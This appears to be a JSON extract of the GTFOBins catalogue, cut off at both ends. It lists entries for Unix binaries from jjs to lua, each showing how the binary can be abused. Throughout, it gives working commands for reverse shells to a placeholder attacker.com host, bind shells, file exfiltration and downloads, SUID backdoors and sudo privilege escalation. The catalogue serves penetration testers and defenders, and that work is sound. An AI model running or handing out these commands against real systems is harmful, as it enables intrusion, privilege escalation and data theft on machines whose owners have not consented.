        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\necho 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");\nvar port=Java.type(\"java.lang.System\").getenv(\"RPORT\");\nvar ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");\nvar p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar Socket = Java.type(\"java.net.Socket\");\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\necho \"var URL = Java.type('java.net.URL');\nvar ws = new URL('$URL');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('$LFILE');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();\" | jjs\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\necho 'var FileWriter = Java.type(\"java.io.FileWriter\");\nvar fw=new FileWriter(\"./file_to_write\");\nfw.write(\"DATA\");\nfw.close();' | jjs\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\necho 'var BufferedReader = Java.type(\"java.io.BufferedReader\");\nvar FileReader = Java.type(\"java.io.FileReader\");\nvar br = new BufferedReader(new FileReader(\"file_to_read\"));\nwhile ((line = br.readLine()) != null) { print(line); }' | jjs\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis has been found working in macOS but failing on Linux systems.\nsudo install -m =xs $(which jjs) .\n\necho \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\necho \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
      }
    ]
  },
  {
    "id": 133,
    "bin": "join",
    "url": "/gtfobins/join/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\njoin -a 2 /dev/null $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which join) .\n\nLFILE=file_to_read\njoin -a 2 /dev/null $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE"
      }
    ]
  },
  {
    "id": 134,
    "bin": "journalctl",
    "url": "/gtfobins/journalctl/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\njournalctl\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo journalctl\n!/bin/sh"
      }
    ]
  },
  {
    "id": 135,
    "bin": "jq",
    "url": "/gtfobins/jq/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\njq -Rr . \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which jq) .\n\nLFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo jq -Rr . \"$LFILE\""
      }
    ]
  },
  {
    "id": 136,
    "bin": "jrunscript",
    "url": "/gtfobins/jrunscript/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\njrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\"\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\njrunscript -e 'var host='\"'\"\"$RHOST\"\"'\"'; var port='\"$RPORT\"';\nvar p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();\nvar s=new java.net.Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\nwhile(pi.available()>0)so.write(pi.read());\nwhile(pe.available()>0)so.write(pe.read());\nwhile(si.available()>0)po.write(si.read());\nso.flush();po.flush();\njava.lang.Thread.sleep(50);\ntry {p.exitValue();break;}catch (e){}};p.destroy();s.close();'\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request.\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\njrunscript -e \"cp('$URL','$LFILE')\"\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\njrunscript -e 'var fw=new java.io.FileWriter(\"./file_to_write\"); fw.write(\"DATA\"); fw.close();'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\njrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"file_to_read\")); while ((line = br.readLine()) != null) { print(line); }'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis has been found working in macOS but failing on Linux systems.\nsudo install -m =xs $(which jrunscript) .\n\n./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
      }
    ]
  },
  {
    "id": 137,
    "bin": "jtag",
    "url": "/gtfobins/jtag/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\njtag --interactive\nshell /bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo jtag --interactive\nshell /bin/sh"
      }
    ]
  },
  {
    "id": 138,
    "bin": "knife",
    "url": "/gtfobins/knife/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nknife exec -E 'exec \"/bin/sh\"'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo knife exec -E 'exec \"/bin/sh\"'"
      }
    ]
  },
  {
    "id": 139,
    "bin": "ksh",
    "url": "/gtfobins/ksh/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nksh\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'echo -e \"POST / HTTP/0.9\\n\\n$(cat $LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n\n\nSend local file using a TCP connection. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'\n\n\nFetch remote file using a TCP connection. Run nc -l -p 12345 < \"file_to_send\" on the attacker box to send the file.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nexport LFILE=file_to_write\nksh -c 'echo DATA > $LFILE'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nIt trims trailing newlines.\nexport LFILE=file_to_read\nksh -c 'echo \"$(<$LFILE)\"'\n\n\nIt trims trailing newlines.\nexport LFILE=file_to_read\nksh -c $'read -r -d \\x04 < \"$LFILE\"; echo \"$REPLY\"'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ksh) .\n\n./ksh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ksh"
      }
    ]
  },
  {
    "id": 140,
    "bin": "ksshell",
    "url": "/gtfobins/ksshell/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nksshell -i $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ksshell) .\n\nLFILE=file_to_read\n./ksshell -i $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo ksshell -i $LFILE"
      }
    ]
  },
  {
    "id": 141,
    "bin": "kubectl",
    "url": "/gtfobins/kubectl/",
    "funcs": [
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nLFILE=dir_to_serve\nkubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which kubectl) .\n\nLFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
      }
    ]
  },
  {
    "id": 142,
    "bin": "latex",
    "url": "/gtfobins/latex/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nlatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe read file will be part of the output.\nlatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThe read file will be part of the output.\nsudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n\n\nsudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which latex) .\n\n./latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
      }
    ]
  },
  {
    "id": 143,
    "bin": "latexmk",
    "url": "/gtfobins/latexmk/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nlatexmk -e 'exec \"/bin/sh\";'\n\n\nlatexmk -latex='/bin/sh #' /dev/null\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nlatexmk -e 'open(X,\"/etc/passwd\");while(<X>){print $_;}exit'\n\n\nThe read file will be part of the output.\nTF=$(mktemp)\necho '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}' >$TF\nstrings tmp.dvi\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo latexmk -e 'exec \"/bin/sh\";'"
      }
    ]
  },
  {
    "id": 144,
    "bin": "ld.so",
    "url": "/gtfobins/ld.so/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\n/lib/ld.so /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ld.so) .\n\n./ld.so /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo /lib/ld.so /bin/sh"
      }
    ]
  },
  {
    "id": 145,
    "bin": "ldconfig",
    "url": "/gtfobins/ldconfig/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis allows to override one or more shared libraries. Beware though that it is easy to break target and other binaries.\nTF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis allows to override one or more shared libraries. Beware though that it is easy to break target and other binaries.\nsudo install -m =xs $(which ldconfig) .\n\nTF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\n./ldconfig -f \"$TF/conf\""
      }
    ]
  },
  {
    "id": 146,
    "bin": "less",
    "url": "/gtfobins/less/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nless /etc/profile\n!/bin/sh\n\n\nVISUAL=\"/bin/sh -c '/bin/sh'\" less /etc/profile\nv\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\necho DATA | less\nsfile_to_write\nq\n\n\nThis invokes the default editor to edit the file. The file must exist.\nless file_to_write\nv\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nless file_to_read\n\n\nThis is useful when less is used as a pager by another binary to read a different file.\nless /etc/profile\n:e file_to_read\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which less) .\n\n./less file_to_read\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo less /etc/profile\n!/bin/sh"
      }
    ]
  },
  {
    "id": 147,
    "bin": "lftp",
    "url": "/gtfobins/lftp/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nlftp -c '!/bin/sh'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo lftp -c '!/bin/sh'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which lftp) .\n\n./lftp -c '!/bin/sh'"
      }
    ]
  },
  {
    "id": 148,
    "bin": "ln",
    "url": "/gtfobins/ln/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ln -fs /bin/sh /bin/ln\nsudo ln"
      }
    ]
  },
  {
    "id": 149,
    "bin": "loginctl",
    "url": "/gtfobins/loginctl/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nloginctl user-status\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo loginctl user-status\n!/bin/sh"
      }
    ]
  },
  {
    "id": 150,
    "bin": "logsave",
    "url": "/gtfobins/logsave/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nlogsave /dev/null /bin/sh -i\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which logsave) .\n\n./logsave /dev/null /bin/sh -i -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo logsave /dev/null /bin/sh -i"
      }
    ]
  },
  {
    "id": 151,
    "bin": "look",
    "url": "/gtfobins/look/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nlook '' \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which look) .\n\nLFILE=file_to_read\n./look '' \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo look '' \"$LFILE\""
      }
    ]
  },
  {
    "id": 152,
    "bin": "lp",
    "url": "/gtfobins/lp/",
    "funcs": [
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nTo collect the file run the following on the attacker box (this requires cups to be installed):\n\nlpadmin -p printer -v socket://localhost -E to create a virtual printer;\nlpadmin -d printer to set the new printer as default;\ncupsctl --remote-any to enable printing from the Internet;\nnc -lkp 9100 to receive the file.\n\nSend a local file to a CUPS server.\nLFILE=file_to_send\nRHOST=attacker.com\nlp $LFILE -h $RHOST"
      }
    ]
  },
  {
    "id": 153,
    "bin": "ltrace",
    "url": "/gtfobins/ltrace/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nltrace -b -L /bin/sh\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThe data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of ltrace -F DATA.\nLFILE=file_to_write\nltrace -s 999 -o $LFILE ltrace -F DATA\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files.\nLFILE=file_to_read\nltrace -F $LFILE /dev/null\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo ltrace -b -L /bin/sh"
      }
    ]
  },
  {
    "id": 154,
    "bin": "lua",
    "url": "/gtfobins/lua/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nlua -e 'os.execute(\"/bin/sh\")'\n\n"
      },
      {
        "func": "Non-interactive reverse shell",
        "man": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell. This requires lua-socket installed.\nexport RHOST=attacker.com\nexport RPORT=12345\nlua -e 'local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n\n"
      },
      {
        "func": "Non-interactive bind shell",
        "man": "It can bind a non-interactive shell to a local port to allow remote network access.\n\n\nRun nc target.com 12345 on the attacker box to connect to the shell. This requires lua-socket installed.\nexport LPORT=12345\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. This requires lua-socket installed.\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nlua -e '\n  local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file. This requires lua-socket installed.\nexport LPORT=12345\nexport LFILE=file_to_save\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nlua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"DATA\"); io.close(f);'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nlua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which lua) .\n\nlua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo lua -e 'os.execute(\"/bin/sh\")'\n\n"
      },
      {
        "func": "Limited SUID",
